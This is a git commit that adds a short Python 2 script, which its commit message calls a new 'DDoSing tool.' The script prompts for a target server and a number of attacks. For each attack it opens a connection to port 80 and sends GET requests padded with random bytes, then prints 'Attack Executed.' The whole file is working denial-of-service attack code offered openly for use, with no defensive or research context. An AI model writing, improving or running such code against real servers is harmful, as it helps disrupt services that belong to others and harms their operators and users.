29615ff731985024f80011465c6c4d996f499d0f
RussianOtter <elangs321@gmail.com>
2016-12-04 00:44:04 -0500

    apdosFEED.py
    The new response DDoSing tool!
    This will give you feedback on the
    server's connection.

---
+++ apdosFEED.py
@@ -0,0 +1,24 @@
+import time, socket, os, sys, string, random
+print("\n-+--=:=-  -=:=--+-")
+print("HTTP FEEDBACK DDoS")
+print("-+--=:=-  -=:=--+-\n")
+host=raw_input("Server: ")
+port=80
+message=random._urandom(1024)
+conn=input( "How Many Attacks:" )
+ip = socket.gethostbyname( host )
+ 
+def dos():
+    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        ddos.connect((host, 80))
+        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
+        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+    except socket.error, msg:
+        print("-[Connection Failed]-=@=--+-")
+    print ( "-[Attack Executed]-=:=--+-")
+    ddos.close()
+ 
+for i in xrange(conn):
+    dos()
